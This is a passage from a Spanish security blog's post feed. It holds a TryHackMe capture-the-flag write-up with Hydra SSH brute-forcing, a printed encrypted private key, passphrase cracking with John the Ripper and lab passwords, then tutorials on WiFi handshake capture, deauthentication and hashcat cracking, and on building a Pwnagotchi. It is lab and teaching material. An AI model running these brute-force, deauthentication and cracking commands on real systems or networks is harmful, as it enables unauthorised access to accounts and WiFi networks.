1867:43h, 16 active [22][ssh] host: 10.10.59.211 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-12 16:49:50 ya tenemos la clave: armando. ahora me conecto por ssh con el usuario de jan y vemos que hay ahí dentro.\n┌──(alberto㉿kali)-[~] └─$ ssh jan@10.10.59.211 the authenticity of host \u0026#39;10.10.59.211 (10.10.59.211)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:xkjdklkocbzjcch0tpriw1pelpuzduftgza4xmda+o4. this host key is known by the following other names/addresses: ~/.ssh/known_hosts:12: [hashed name] are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;10.10.59.211\u0026#39; (ed25519) to the list of known hosts. jan@10.10.59.211\u0026#39;s password: welcome to ubuntu 16.04.4 lts (gnu/linux 4.4.0-119-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. the programs included with the ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ubuntu comes with absolutely no warranty, to the extent permitted by applicable law. the programs included with the ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ubuntu comes with absolutely no warranty, to the extent permitted by applicable law. last login: mon apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$ sabemos que hay otro usuario llamado kay, así que tiene que tener una carpeta personal. me muevo hasta ella y reviso que hay.\njan@basic2:~$ ls -la total 12 drwxr-xr-x 2 root root 4096 apr 23 2018 . drwxr-xr-x 4 root root 4096 apr 19 2018 .. -rw------- 1 root jan 47 apr 23 2018 .lesshst jan@basic2:~$ cd .. jan@basic2:/home$ ls jan kay jan@basic2:/home$ cd kay jan@basic2:/home/kay$ ls -la total 48 drwxr-xr-x 5 kay kay 4096 apr 23 2018 . drwxr-xr-x 4 root root 4096 apr 19 2018 .. -rw------- 1 kay kay 756 apr 23 2018 .bash_history -rw-r--r-- 1 kay kay 220 apr 17 2018 .bash_logout -rw-r--r-- 1 kay kay 3771 apr 17 2018 .bashrc drwx------ 2 kay kay 4096 apr 17 2018 .cache -rw------- 1 root kay 119 apr 23 2018 .lesshst drwxrwxr-x 2 kay kay 4096 apr 23 2018 .nano -rw------- 1 kay kay 57 apr 23 2018 pass.bak -rw-r--r-- 1 kay kay 655 apr 17 2018 .profile drwxr-xr-x 2 kay kay 4096 apr 23 2018 .ssh -rw-r--r-- 1 kay kay 0 apr 17 2018 .sudo_as_admin_successful -rw------- 1 root kay 538 apr 23 2018 .viminfo jan@basic2:/home/kay$ cat pass.bak cat: pass.bak: permission denied jan@basic2:/home/kay$ tenemos un fichero llamado pass.bak que tiene pinta de ser la bandera de la sala para la última pregunta. desgraciadamente no puedo acceeder a su contenido. sin embargo veo hay una carpeta oculta llamada .ssh, seguramente contendra la clave de autenticación ssh encriptada. vamos a echarle un ojo:\njan@basic2:/home/kay$ ls .ssh/ authorized_keys id_rsa id_rsa.pub jan@basic2:/home/kay$ cat .ssh/id_rsa -----begin rsa private key----- proc-type: 4,encrypted dek-info: aes-128-cbc,6aba7de35cdb65070b92c1f760e2fe75 ionb/j0q2pd56ez23oaajxlvhusz1crrr4onguankcrxg3+9vn6xcujpzuduutlz o9dyiejb4wuztuebpsmb487rdfvktovqrvhty1k2aly2lka2cnfjz8llv+fmadsn xrvjw/hrigcxpy8b7nsa1eipyrpzhih3qofiylspmyv79rc65i6frkdsvxxzbdfx akan+3t5fu49aevkbjtznltebw31mxjv0llxaqiax5qfexmaciqouwchatlpvxmn lg4bag7cvxs1ampieflx7un4rub9nzs4zp0lplbcb4ueawx0tt+vkd6kzh+bk0au hwqjcdnb/u+drasu3oxqyklku2dpseu7rlvpaqa6y+ogk/wotbntrkrngkqlqxml liwzye4yrletfc275hzvvyh6fklgtofaly0bmqgirm+ewvoxorzpblv8iyntddde 3jrjqboglps01hawkirxupaer18lcz+oly00vw2onl2xkugtqpv2jwh04ygdxbfj lywlxxnjjpvmhkc6a75pe4zvxfmmt0qck4oko1argmqlfnwapxjyv6hauuovexn7 bupo+elyvs5mo5tbpwdhi0nrfngp1t6bn7tvb77acaygzhdlpiaqzmv/0hwrtnrb rvhy1cuf7xgnmbmzyhznewmppe2i8mfsavfcjec3cdgn5tvquxfh6cjjrvrhdxvy vqvjsot+czf7mbwm5nfstpplonndc6jmrueujeiblzbcw6bx5s+b95efecewmmve b0whqnptdtvtg3sfdjxp0hggxqk4bambnm4chfck7rpvcrjskywyvedjmyvc87z0 ysvopvn9wnfoudon+u4pyp6pmnu4zd2qekniwyexzizmyypugcfda0sarf6/kkwg ohoacck3ihaqkkbo+sflgxbahxb6k0ocmqawioxyjunpkn8bzzlqljs1jrzxibhl vapev7x25nauyu5u4bgtfhb/f8abkbel4xlwr+4hxbotpjx6rvbyepz/kvioq3s1 gpwhsrzon320xa4hopkcg66jdyhls6b328uvii6da6fryiona4tejjtpo5rpcsek qkig65gicbpcwj1u4i9mehzehc0r2lyufzbnfyur0qcvo8+ms8x75seeonz8auql 4di4ixitq5sachp4y/ntmz1a3q0fnjzxaqdfk/htadhmq5digxnnw3tbmd8wgveg vfnsaexxeza39jogm3vbon6caxpz124kj0bewzxcbzwki0cphflyumodelqp/nik osxlojc8azemil5rah5gdclt4k67wei9j/jq6zlut0vsmlono1iifdsmo4nunyj3 z+3xtdtzoul5niy4jjcplhtnnjalqnpcoaqad7gv3rd/asml2l2kb0ut8prttt+s baxkpfh0dhmowngmdatjp+emrc6s896+haxvcvpxlknti7+jsntwupbcntsfvo19 l9+xxd55ytvo1y8rmwjopzx7h8ort7u+y9n/bvtbt+xzmylnu+3qoq4w2qoynm2p nzjvppeh+8dboucb5bfxsisknxnysced4lspxue4ums3yxbpz/44syy8kezrazai fn2nnjwq1u2fajwntmn5oishondeabf9ilaq46lsgpmrahnnxwzozh+/lgfqmgji i/zn/2kspuew/5mqwwvfik8qu38m7m+mli5zx76snfje9suva3ehhp2aen5hwdmw x+cudsixpo10rdx+ommoexmqn5xc3lvtz1rknqono7fa21czucmxi2j/ltmywzel oscgwntlqpb6sfldj5cfa5cdzlaxl1t7xdrzwggsnct+6cxszendyuolri9ez8xx ohhz45rgacphcdwcrkcbfoqs01hjq9nsje2w403ljmsx/u3ylauuavgrhkfoejnx cnputuhhcvqssr9cui5it5toz+iidfloyb+f82y0wn5tb6ptd/onvdtskilfe731 dwoy3zfl0l1fl6ag0ivwtrpbl1ggqoxf4wmbwv9bdf0zp/6uatviv1dheqpd8otj vxfx9bkdezp2ql2yohuekbdu+7dyu9k5ng0sqak7jjeokd7/m5i8cfwq/g5vqa8r sgsoxq5mr3mkf1n/w6pnbwxyh7n2ll36znfaco1v6szmaa8/489apbbjpxhutqnu eu/lp8xqlxmmpvpsdacmtqa1ipovl9m+a+stre2eyt8hzirmiuaaotziv4chuy6q 3qp52kfzzjbt3cin2amyv205enijvrsacpi3pzrnljsbgxmxokvxdvpc5mr/pniv wrrvsgjqjotpfrshhjq3qsoj/r/8/d1vcvtd4usfz+j1y9kxklat/ok491zk8nwg uruvqvbhds7cq8c5rfgjuyd79gugh3he5y7bl+mdxknzlmlzonauc5bkv4i+yuj7 agiexxrijxlwf4g0bsl5vbydm55xlnbryof62ucys9ecrar4ngmggcxfyyncxmyk axdkwswwwf/yhewx8ggtesv5ad+bxdemoiak8c1yy1tzwdamzsnosyhxuvlb4jn5 phql3r8orzetsuxxfdvkrpeaokee1vhevzqxvsohgcuidykca6al6wydi9i2+unr ogjvvvbvvzibh+w5yjhytrinq7dmqayx1yb2pmc+lergf3yrp9a2klaadk9dbqcv ev6ctcfzhbhyvqml1wqwduztrotwfl80jo8qdlq+he0bvcb/o2fxqkyetgfh4/uc d5qrshak15dnhh4ixrikpla799cxrhwi7mf5ji41f3o7iaejwkh6q/yjgpvgj8lg oscp/iugxt7u+91j7qov/rbtro7geyx5lc/sw1j6t6sjkega8m9fs10h4terepkt t/ccvlbkm22ewao8glguhn5vtanh0mtlnpjfnlvjcdhl0hkzi3zzmdrxhql+/wjq 4eacahk1hul3esen3zpqwrndgaapxh+lgpye8sz1it8apup8gzabufjbbefmwnyb e5ofsdluiohcvzsw/diurf+4liq3r36bu2r5+kmpfikkew1tywiy7cpfojsd74vc 3jt1/zw3xcb76r75sg5h6q4n8gu5c/m0cdq16h9mhwpdin9oztqo2znxfvpuxthy -----end rsa private key----- pues ya tenemos la clave privada de kay para acceder al servidor por ssh. me la copio en mi equipo y me preparo para romperla. aunque antes hay que convertirla en un formato compatible para la herramienta john the ripper. la guardo en un fichero llamado rsa_original y la paso por la herramienta ssh2john y hago que me la guarde en un fichero llamado crack.txt. despues la paso por john the ripper:\n┌──(alberto㉿kali)-[~/descargas] └─$ ssh2john rsa_original \u0026gt; crack.txt ┌──(alberto㉿kali)-[~/descargas] └─$ john --wordlist=rockyou.txt crack.txt using default input encoding: utf-8 loaded 1 password hash (ssh, ssh private key [rsa/dsa/ec/openssh 32/64]) tras unos minutos, obtenemos la contraseña: beeswax\nesta nos servirá para conectarnos por ssh con el usuario de kay, pero tenemos que usar la clave pública para que nos permita realizar la conexión, así que aprovechamos el equipo en el que nos hemos colado que tiene los dos pares de claves para hacer la conexión desde aqui:\njan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@10.10.59.211 could not create directory \u0026#39;/home/jan/.ssh\u0026#39;. the authenticity of host \u0026#39;10.10.59.211 (10.10.59.211)\u0026#39; can\u0026#39;t be established. ecdsa key fingerprint is sha256:+fk53v/lb+2pn4opl7gn/duvhvvo0lt9n4w5ifchysq. are you sure you want to continue connecting (yes/no)? yes failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts). enter passphrase for key \u0026#39;id_rsa\u0026#39;: welcome to ubuntu 16.04.4 lts (gnu/linux 4.4.0-119-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. last login: mon apr 23 16:04:07 2018 from 192.168.56.102 kay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ y tras conectarme por ssh con el usuario de kay, puedo mostrar el contenido del fichero pass.bak y obtener la bandera final de la sala heresareallystrongpasswordthatfollowsthepasswordpolicy$$\n¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"Basic Pentesting [TryHackMe]"},{"date":"2022-09-29","image":"/images/post_pics/tutorial-aircrack/aircrack-ng-new-logo.jpg","link":"https://k3ssdev.github.io/posts/aircrack-ng_hacking_wifi/","summary":"Aircrack-ng: hacking de redes WiFi \u0026gt; En este post voy a explicar brevemente los principales conceptos del hacking de redes WiFi, obviamente con fines educativos y en un entorno controlado. Para analizar las redes inalámbricas y crackear las contraeñas voy a usar el conjunto de herramientas que proporiona Aircrack-ng.","tags":["cracking","hacking","hashcat","linux","tutorial","wifi"],"text":"aircrack-ng: hacking de redes wifi \u0026gt; en este post voy a explicar brevemente los principales conceptos del hacking de redes wifi, obviamente con fines educativos y en un entorno controlado. para analizar las redes inalámbricas y crackear las contraeñas voy a usar el conjunto de herramientas que proporiona aircrack-ng.\nmonitorización: escaneo de redes y captura de paquetes. usaremos las herrmientas airmon-ng (cambia la interfaz wifi a modo monitor) y airodum-ng (scan y captura). ataques: replay attacks, desautenticaciones, puntos de acces falsos y otros ataques. se usará el paquete aireplay-n. cracking: romper contraseñas wep y wpa/wpa2-psk. aquí usaremos aircrack-ng. aunque la guía está hecha en linux (con kali instalado en una raspberry pi 4), todo esto puede hacerse sin problema en windows y macos, en la misma página oficial vienen los pasos para instalarlo en dichas plataformas.\npágina oficial de aircrack-ng\ngithub aircrack-ng\nteoría protocolo 4-way handshake como nos vamos a centrar en capturar paquetes de redes protegidas con wpa/wpa2, vamos a conocer un poco el proceso. aunque ya lo expliqué en el post anterior (tutorial del pwnagotchi), recordarlo no está demás. para poder obtener los hashes de las contraseñas wpa y poder crackearlas, es necesario capturar paquetes que contengan paquetes del protocolo 4-way handshake, en el que se intercambian mensajes con la clave precompartida (psk) para validar la sesión entre el cliente y el punto de acceso.\n*source: https://pwnagotchi.ai/intro/\nmientras se monitoizan las redes, ap y cliente pueden intercambar las psk. pero si con eso no fuese suficiente, usaremos las mismas técnicas que aprendimos con nuestro amigo pwnagotchi:\ndesautenticar los clientes conectados al ap. un dispositivo desautenticado debe volver a autenticarse en su punto de acceso volviendo a realizar el protocolo 4-way handshake con el ap, permitiendo capturar los paquetes de protocolo de enlace y recopilar más material descifrable.\nenvíar tramas de asociación directamente a los propios puntos de acceso para intentar forzarlos a filtrar el pmkid.\nsi tenemos exito y logamos capturar los paquetes que contengan los handshakes, podremos extraer el hash de la contraseña y crackearlo mediante un ataque de fuerza bruta o de diccionario.\nvamos al lío lo primero es instalarlo. no quiero extederme mucho, ya que viene instalado por defecto en kali linux y parrot os, pero si no lo teneis en vuestro sistema echad un vistazo al github de aircrack-ng. tambien necesitarás un adaptador wifi que permita el modo monitor (muchos adaptadores integrados en portatiles no lo admiten, es posible que necesites un adaptador externo). si tienes una raspberry pi es una buena opción, yo la he probado y funciona sin problemas.\nlo siguiente que voy a hacer es revisar las interfaces de red y comprobar que está funcionando correctamente. ejecutamos el comando ip a para ver las interfaces y la configuración de las mismas. despues, pondremos la interfaz inalambrica en modo monitor, de forma que pueda capturar paquetes e inyectar si es necesario.\nip a aqui es importante tener en cuenta como se llama la interfaz wifi que vamos a usar. en mi caso, se llama wlan0, pero puede tener otro nombre. además, es posible que los servicios en marcha impidan que se cambie a modo monitor, en tal caso hay que ejecutar los siguientes comandos:\nsudo airmon-ng check kill sudo airmon-ng start wlan0 en la captura se ve que ejecuto primero el comando de start wlan0 pero me da un error ya que hay servicios fucionando que lo impiden. en mi caso, ejecuté el check kill y despues el start wlan0 de nuevo.\nahora que la tarjeta wifi esta en modo monitor, podemos escanear las redes a nuestro alcance y analizar cual será el objetivo. he preparado una red llamada ap_test que usaré como objetivo. la contraseña que he preparado para esta red es sencilla, acd1234, de modo que pueda explicar el proceso completo de forma segura. mientras se monitrizan las redes wifi, podemos usar el tabulador para seleccionar los ap y movernos por ellos con las flechas. además, podemos marcar con colores las redes con la tecla m, o podemos ordenarlas con la tecla s por diferentes criterios. sudo airodump-ng wlan0mon #en mi caso wlan0mon es el nombre que tiene la tarjeta tras activarla en modo monitor, comprueba el nombre de la tuya, puede que no haya cambiado tras elegir el objetivo, vamos a monitorizar el ap elegido y guardarmos los datos en varios ficheros. necesitamos capturar los paquetes wpa que contengan potencalmente la clave precompartida. usaremos el mismo comando que en el punto anterior, pero sta vez añadiremos las opiones para enfocarnos en el ap elegido, el canal en el que trabaja y estableceremos el prefijo de los ficheros generados. sudo airodump-ng wlan0mon -c \u0026#34;numero de canal\u0026#34; --bssid \u0026#34;mac address del ap\u0026#34; -w \u0026#34;nombre_fichero\u0026#34; si la señal es buena y los clientes y el ap intercambian paquetes que contengan los wpahandshakes, el programa nos indicará que se ha consguido con un mensaje en la esquina superior derecha que pone [wpa hanshake: \u0026ldquo;mac address ap\u0026rdquo;]\npor último, ya solo nos queda tratar los ficheros .cap obtenidos y crackear los hashes resultantes para obtener la clave wpa/wpa2. aunque se puede hacer con el propio aircrack-ng, he optado por hacerlo como explqué en el tutorial del pwnagotchi, usando hcxtools para convertir el fichero de las capturas al formato que hashcat necesita para crackear la contraseña. con el siguiente comando se pued convertir el fichero .cap al formato hc22000 que necesita hashcat para atacar la clave.\nhcxpcapngtool -o hash.hc22000 fichero.cap dónde -o hash.hc2000 es el fichero de salida.\nhcxtools\nhashcat\n*puedes usar el conversor online de la pagina de hashcat.\nfinalmente, atacamos la contraseña con hashcat tal y como hicimos en la guía del pwnagotchi:\nataque de diccionario\nhashcat -m 22000 fichero_hash /usr/share/wordlists/rockyou.txt -o outfile.txt metodo fuerza bruta\nhashcat -a 3 -w 3 -m 22000 fichero_hash ?a?a?a?a?a?a?a?a --increment --increment-min=8 --increment-max=14 -o outfile.txt -a 3 indica ataque de diccionario. -w 3 para indicar carga de trabajo alta. \u0026ndash;increment es para hacer un ataque incremental, añadiremos también una longitud mínima y una máxima (wpa tiene a partir de 8 caracteres). hay que tener en cuenta que un ataque de fuerza bruta puede tardar horas, dias o semana (en el mejor de los casos), segun lo compleja que sea la contraseña. por ello, lo mejor es hacer un ataque de diccionario. cuanto más grande sea el diccionario, más probabilidades de romper la contraseña tendremos.\npara ello, hay muchos listados que nos pueden ser útiles. a continuación dejo varios recursos para descargar diccionarios.\ngithub seclists crackstation wordlist wakpass big lists weakpass all-in-ne lists en mi caso, hice un ataque de fuerza bruta usando la máscara abcd?d?d?d?d para acortar el tiempod de procesamiento, ya que la contraseña empieza por abcd y despues he usado los comodines ?d para indicar las posiciones donde a un caracter numérico.\ntras finalizar el ataque, el resultado obtenido ha sido abcd1234, una contraseña muy fácil de crackear. este ejemplo sirve para comprobar que las contraseñas sencillas que todo el mundo ha usado en algún momento que otro, son faciles de desencriptar con las herramientas y el tiempo necesario. el uso de contraseñas tipo madrid_2022, p@ssw0rd!2815 y combinaciones similres son inseguras, ya que pueden romperse con ataques combinados de diccionario y mascaras o reglas de permutación. así que recordad:\nusad contraseñas complejas que mezclen simbolos, letras y números para estar más protegidos!\n(◕‿‿◕) hack the planet! disclaimer: toda la información proporcionada en este tutorial es solo para fines educativos. no me hago responsable del mal uso de la información aquí mostrada.\neste tutorial está relacionado con la seguridad informática y no promueve la piratería informática/craqueo/piratería de software.\neste tutorial contiene información relacionada con contraseñas wpa y muestra cómo podrían desencriptarse. solo facilita información sobre las formas legales de recuperar las contraseñas.\n","title":"Aircrack-ng: hacking de redes WiFi"},{"date":"2022-09-13","image":"/images/post_pics/tutorial-pwnagotchi/Imagen0.jpg","link":"https://k3ssdev.github.io/posts/tutorial_pwnagotchi/","summary":"¿Qué es un Pwnagotchi? \u0026gt; En términos generales, Pwnagotchi es una mascota virtual para hackers y entusiastas de la ciberseguridad. Pero a diferencia de otras mascotas, ésta se alimenta capturando \u0026ldquo;handshakes\u0026rdquo; de las comunicaciones wifi y cuenta con una IA basada en el modelo A2C, lo que significa que utiliza el aprendizaje por refuerzo a través de métodos de prueba y error en comportamientos específicos que maximicen su recompensa en un entorno dinámico.","tags":["hacking","hashcat","linux","pet","raspberry","tutorial","wifi"],"text":"¿qué es un pwnagotchi? \u0026gt; en términos generales, pwnagotchi es una mascota virtual para hackers y entusiastas de la ciberseguridad. pero a diferencia de otras mascotas, ésta se alimenta capturando \u0026ldquo;handshakes\u0026rdquo; de las comunicaciones wifi y cuenta con una ia basada en el modelo a2c, lo que significa que utiliza el aprendizaje por refuerzo a través de métodos de prueba y error en comportamientos específicos que maximicen su recompensa en un entorno dinámico.\neste tutorial adapta la información de la página oficial de pwanagotchi. puedes encontrar más información en los siguientes enlaces:\nhttps://pwnagotchi.ai/\ngithub pwnagotchii\nhttps://pwnagotchi.ai/faq/\ndisclaimer: toda la información proporcionada en este tutorial es solo para fines educativos. no me hago responsable del mal uso de la información aquí mostrada.\neste tutorial está relacionado con la seguridad informática y no promueve la piratería informática/craqueo/piratería de software.\neste tutorial contiene información relacionada con contraseñas wpa y muestra cómo podrían desencriptarse. solo facilita información sobre las formas legales de recuperar las contraseñas. \u0026gt;\nalimentando al pwnagotchi 4-way handshake de wpa2 en las redes wifi, cuando un dispositivo se conecta al punto de acceso, es necesario que se lleve un proceso conocido como 4-way handshake para que se generen las claves de encriptación wpa. durante esta comunicación, ambos intercambias 4 paquetes y se generan las claves que se usaran durante la sesión para que el cliente pueda conectarse y ambos puedan intercambiar información de forma segura.\n*source: https://pwnagotchi.ai/intro/\nes durante este intercambio cuando nuestro pwnagotchi intercepta estas comunicaciones, ya que su tarjeta de red wifi está configurada en modo promiscuo para poder captarlas, aunque no vayan dirigidas a él. y aquí hace lo siguiente:\ndesautentica las estaciones cliente que detecta. un dispositivo desautenticado debe volver a autenticarse en su punto de acceso volviendo a realizar el protocolo de enlace de 4 vías con el ap, lo que le da a pwnagotchi otra oportunidad de olfatear los paquetes de protocolo de enlace y recopilar más material descifrable.\nenvía tramas de asociación directamente a los propios puntos de acceso para intentar forzarlos a filtrar el pmkid.\ncuando captura handshakes, el pwnagotchi se alimenta, afectando a su estado de ánimo y ayudándole a aprender gracias a su ia como obtener mejores recompensas. de esta forma, nuestra mascota va aprendiendo poco a poco a ser más eficiente, ¡e incluso puede aprender a trabajar en grupo cuando hay otros pwnagotchis cerca!\nconstruyendo el pwnagotchi necesitamos:\nraspberry pi zero w (también puede usarse un modelo 3 o modelo 4) tarjeta microsd (8gb mínimo recomendado, elegir una que sea rápida).\nun cable micro-usb de calidad que permita la transferencia de datos (¡no solo la carga!)\nuna fuente de alimentación. puedes usar un powerbank para móviles, o una batería ups lite v1.2 o pisugar para la raspberry pi. - ups lite v1.2\npantalla waveshare eink de 2,13” v2 (opcional) - waveshare e-ink display v2\ncarcasa: carcasa para waveshare v2 carcasa waveshare + ups\nno es necesario tener fuente de alimentación especifica, puedes conectarlo en casa a un cargador de móvil o al ordenador, y la pantalla tampoco es esencial ya que puede usarse en modo \u0026ldquo;headless\u0026rdquo;. a continuación, detallo la instalación básica sin estos dos elementos, ya que pueden añadirse posteriormente.\npasos de la instalación:\ndescargar la imagen disponible en github - se recomienda usar la 1.5.3 ya que la 1.5.5 no carga bien la ia (pero tiene solución si se usa la 1.5.5). descargamos esta v1.5.3\nflashea la imagen con balenaetcher, se puede descargar de la pagina de balena\nantes de arrancar el pwnagotchi, hay que meter un fichero llamado config.toml en la partición boot de la tarjeta microsd. a continuación, pongo lo que he usado para que funcione sin pantalla y para que se conecte a al teléfono por bt para poder verlo y gestionarlo. el whitelist deberían ser las redes que no quieras que guarde los handshakes, cambiad los valores\nestos son los valores del fichero, por favor cambia los valores de whitelist, grid.exclude y android.mac. si se usa un display waveshare, cambiar el valor de ui.display.type\nmain.name = \u0026#34;nombre_del_pwnagotchi\u0026#34; main.lang = \u0026#34;es\u0026#34; main.whitelist = [ \u0026#34;tu_red_wifi\u0026#34;, \u0026#34;otra_red_wifi, \u0026#34;fo:od:ba:be:fo:od\u0026#34;, \u0026#34;fo:od:ba\u0026#34;, ] main.plugins.grid.enabled = true main.plugins.grid.report = true main.plugins.grid.exclude = [ \u0026#34;tu_red_wifi\u0026#34;,] ui.display.enabled = true ui.display.type = \u0026#34;inky\u0026#34; ui.display.color = \u0026#34;black\u0026#34; ui.display.rotation = 180 main.plugins.bt-tether.enabled = true main.plugins.bt-tether.devices.android-phone.enabled = true main.plugins.bt-tether.devices.android-phone.search_order = 1 main.plugins.bt-tether.devices.android-phone.mac = \u0026#34;direccion_mac_telefono\u0026#34; main.plugins.bt-tether.devices.android-phone.ip = \u0026#34;192.168.44.44\u0026#34; main.plugins.bt-tether.devices.android-phone.netmask = 24 main.plugins.bt-tether.devices.android-phone.interval = 1 main.plugins.bt-tether.devices.android-phone.scantime = 10 main.plugins.bt-tether.devices.android-phone.max_tries = 10 main.plugins.bt-tether.devices.android-phone.share_internet = true main.plugins.bt-tether.devices.android-phone.priority = 1 main.plugins.bt-tether.devices.ios-phone.enabled = true main.plugins.bt-tether.devices.ios-phone.search_order = 2 main.plugins.bt-tether.devices.ios-phone.mac = \u0026#34;direccion_mac_iphone\u0026#34; main.plugins.bt-tether.devices.ios-phone.ip = \u0026#34;172.20.10.6\u0026#34; main.plugins.bt-tether.devices.ios-phone.netmask = 24 main.plugins.bt-tether.devices.ios-phone.interval = 5 main.plugins.bt-tether.devices.ios-phone.scantime = 20 main.plugins.bt-tether.devices.ios-phone.max_tries = 0 main.plugins.bt-tether.devices.ios-phone.share_internet = true main.plugins.bt-tether.devices.ios-phone.priority = 999 main.plugins.memtemp.enabled = true main.plugins.memtemp.scale = \u0026#34;celsius\u0026#34; main.plugins.memtemp.orientation = \u0026#34;horizontal\u0026#34; coloca la tarjeta y enciende el pwnagotchi. dejarle un rato para que arranque y cargue la ia (esto es muy importante, mínimo 10 minutos). si hemos configurado la mac del teléfono en el fichero config.toml, se nos conectara por bt al teléfono cuando haya arrancado. nos debería llegar una solicitud de emparejamiento. antes de aceptarla, seleccionar en el teléfono \u0026ldquo;compartir conexión por bluetooth\u0026rdquo; para que le pueda dar conexión a internet cuando se conecte. una vez se emparejan, podemos acceder a la dirección ip 192.168.44.44:8080 en android y 172.20.10.6:8080 si es un iphone/ipad.\ndisfrutamos de nuestro pwnagotchi ^__^\nconfiguración y uso ahora nos podemos conectar a nuestro pwnagotchi por bt, por lo que podemos además de verle a través del navegador, podemos acceder a él a través de ssh. podemos usar termux en android para conectarnos directamente desde el teléfono. si queremos conectarnos desde nuestro ordenador, lo conectaremos por usb (dejando conectado también el cable de corriente). al conectarlo deberemos configurar una conexión con el dispositivo rndis detectado. en windows puede dar problemas, hay que buscar el controlador de rndis para windows y actualizarlo desde el administrador de dispositivos. en linux, lo detectará sin problema. añadimos la conexión con el dispositivo rndis y la configuramos con los siguientes parámetros: ipv4: 10.0.0.1 netmask: 255.255.255.0 dns: 8.8.8.8 el resto de los valores no hacen falta. una vez hecho, podemos conectarnos por ssh desde el equipo a la dirección 10.0.0.2 pi@10.0.0.2 contraseña: raspberry ahora cambiamos la contraseña del usuario por seguridad con el comando passwd.\nactualizamos el pwnagotchi. ¡apt update y apt upgrade no funcionan bien debido a un problema con la firma del source del kernel re4son!\nversión 1.5.3 -\u0026gt; vamos a actualizar a la versión 1.5.5 con estos comandos sudo pwnagotchi plugins update sudo pwnagotchi plugins upgrade versión 1.5.5 -\u0026gt; el anterior paso no es necesario, pero se puede hacer. para arreglar el problema que tiene con la ia que no carga, ejecutamos el siguiente comando que lo arreglará: sudo pip3 install --upgrade numpy este proceso puede tardar mucho tiempo, se recomienda hacerlo desde el ordenador y no usando termux.\nañadimos alias pwnlog y pwnver en el fichero .bashrc alias pwnlog=\u0026#39;tail -f -n300 /var/log/pwn*.log | sed --unbuffered \u0026#34;s/,[[:digit:]]\\{3\\}\\]//g\u0026#34; | cut -d \u0026#34; \u0026#34; -f 2-\u0026#39; alias pwnver=\u0026#39;python3 -c \u0026#34;import pwnagotchi as p; print(p.__version__)\u0026#34;\u0026#39; accedemos a la web ui del pwnagotchi y pinchamos en plugins. aquí podemos activar los plugins, en este caso activamos logtail y webcfg. una vez activados y recargada la página, si pinchamos en los nombres podemos ver un log en el caso de logtail y en wbcfg accederemos a la configuración del fichero configuration.toml que hay corriendo en el sistema, donde podremos hacer cambios. a partir de aquí, podemos seguir usando nuestro pwnagotchi. los siguientes pasos serían insstalar nuevos plugins desde la línea de comandos y configurar la copia de seguridad de nuestro nuevo coleguita por si fuese necesario restaurarlo en el futuro.\narreglando apt update y apt upgrade si intentas actualizar las fuentes y los paquetes, encontrarás que da un error que no permite hacerlo. a continuación, muestro la solución que he encontrado:\nsudo nano /etc/apt/preferences.d/kali.pref (contenido más abajo) wget -o - https://re4son-kernel.com/keys/http/archive-key.asc | sudo apt-key add - sudo apt update –allow-releaseinfo-change-suite -y sudo apt full-upgrade -y contenido fichero /etc/apt/preferences.d/kali.pref\npackage: * pin: release n=kali-pi pin-priority: 999 este proceso puede tardar y nuestro pwnagotchi podria desconectarse del telefóno o del pc, así que recomiendo ejecutar todo esto en una sesión de screen o tmux\nhaciendo amigos nuestro pwnagotchi nos permite enviar mensajes cifrados mediante pwnmail, solo necesitamos el fingerprit del perfil de otra persona. a continuación, os dejo el mío por si queréis añadirme.\npwnamon las caras de nuestro pwnagotchi a continuación, se explican las caras del pwnagotchi. este fragmento está sacado directamente de la web oficial.\nhttps://pwnagotchi.ai/intro/\nel siguiente listado es el conjunto predeterminado de rostros que se pueden personalizar cambiándolo en la sección ui.faces dentro del fichero /etc/pwnagotchi/config.toml\n(⇀‿‿↼) durmiendo este es el estado desde el que comenzará la unidad. además, de vez en cuando tu pwnagotchi también realizará siestas de unos segundos mientras salta entre los canales wifi.\n(≖‿‿≖) despertar la unidad está en los últimos segundos de su siesta.\n(◕‿‿◕) despierto / normal esta cara es el estado neutral despierto de la unidad. se utilizará para suavizar la transición entre otros estados de ánimo y en general cuando no exista una causa externa de estados de ánimo positivos o negativos. también se puede usar, al azar, cuando se encuentra otra unidad por primera vez (cada unidad mantiene un registro de todas las unidades que encontró).\n(⚆_⚆), (☉_☉) observando (estado de ánimo neutral) tu pwnagotchi está esperando y observando lo que bettercap puede encontrar en todos los canales en los que salta.\n( ◕‿◕), (◕‿◕ ) observando (feliz) cuando hay una o varias unidades cerca y su contador de bonos acumulativo es mayor o igual que elpersonality.bond_encounters_factor, esta será la cara de la unidad durante la observación.\n(°▃▃°) intenso la unidad está enviando una trama de asociación a un punto de acceso para obligarlo a filtrar el pmkid.\n(⌐■_■) guay la unidad está desautenticando una estación cliente desde un punto de acceso. esta cara también se puede elegir al azar cuando se encuentra con otra unidad por primera vez.\n(•‿‿•) feliz tu pwnagotchi es feliz en uno de los siguientes casos:\nla ia acaba de terminar de cargarse y está lista. se acaba de capturar material clave válido para un punto de acceso. en modo manu, si la última sesión fue corta o si se ha capturado algún apretón de manos durante la misma. cuando se cumple otra unidad y el nivel de bonos es lo suficientemente alto. (^‿‿^) agradecido tu pwnagotchi está agradecido en uno de los siguientes casos:\nel nivel de bonos acumulativo de las unidades cercanas es al menos cinco veces elpersonality.bond_encounters_factor. la unidad debería estar aburrida, pero hay suficientes unidades amigas cerca. la unidad debería estar triste, pero hay suficientes unidades amigas cerca. la unidad debería estar sola, pero hay suficientes unidades amigas cerca. (ᵔ◡◡ᵔ) emocionado tu pwnagotchi está excitado por uno de los siguientes casos:\nel número de épocas con alguna actividad es mayor o igual quepersonality.excited_num_epochs. aleatoriamente si se cumple una unidad 